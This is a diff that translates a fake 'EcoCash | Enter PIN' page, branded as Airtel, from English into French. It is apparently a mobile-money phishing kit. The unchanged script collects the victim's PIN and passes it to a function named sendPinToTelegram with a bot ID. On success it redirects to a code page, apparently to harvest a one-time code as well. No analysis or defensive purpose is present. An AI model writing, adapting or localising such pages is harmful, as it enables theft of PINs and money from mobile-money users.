@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EcoCash | Enter PIN</title>
+<title>EcoCash | Entrer le code PIN</title>
 
 <style>
 *{
@@ -36,7 +36,7 @@ body{
   background:transparent;
 }
 
-/* BRAND NAME (AIRTEL STYLE) */
+/* BRAND NAME */
 .brand-name{
   font-size:42px;
   font-weight:600;
@@ -106,7 +106,7 @@ body{
   margin-top:28px;
 }
 
-/* REGISTER / HELP BUTTONS */
+/* BUTTON */
 .action-buttons{
   display:flex;
   gap:12px;
@@ -146,11 +146,11 @@ body{
       Airtel
     </div>
 
-    <div class="welcome-text">Welcome</div>
+    <div class="welcome-text">Bienvenue</div>
 
     <input class="phone-display" id="phoneDisplay" readonly>
 
-    <div class="pin-label">Enter your PIN</div>
+    <div class="pin-label">Entrez votre code PIN</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -166,21 +166,20 @@ body{
   <div class="lower-section">
 
     <div class="action-buttons">
-      <div class="action">Login</div>
+      <div class="action">Connexion</div>
     </div>
 
     <div class="footer">
-      By continuing, you agree to the Terms and Conditions
+      En continuant, vous acceptez les termes et conditions
     </div>
 
   </div>
 
 </div>
 
-<!-- SCRIPT UNCHANGED -->
 <script>
 document.getElementById("phoneDisplay").value =
-  localStorage.getItem("phone") || "Unknown Number";
+  localStorage.getItem("phone") || "Numéro inconnu";
 
 const botId = new URLSearchParams(window.location.search).get("botId");
 const boxes = document.querySelectorAll(".pin-boxes input");
@@ -224,10 +223,10 @@ boxes.forEach((box,i)=>{
       const name = localStorage.getItem("name")||"Unknown";
       const phone = localStorage.getItem("phone")||"Unknown";
       boxes.forEach(b=>b.disabled=true);
-      statusEl.textContent="Submitting PIN...";
+      statusEl.textContent="Envoi du code PIN...";
       const res = await sendPinToTelegram(name,phone,pin);
       if(!res||!res.requestId){
-        statusEl.textContent="Failed. Try again.";
+        statusEl.textContent="Échec. Veuillez réessayer.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus(); return;
       }
@@ -235,7 +234,7 @@ boxes.forEach((box,i)=>{
       if(ok){
         window.location.href="code.html?botId="+botId;
       } else {
-        statusEl.textContent="Incorrect PIN.";
+        statusEl.textContent="Code PIN incorrect.";
         boxes.forEach(b=>{b.disabled=false;b.value="";});
         boxes[0].focus();
       }
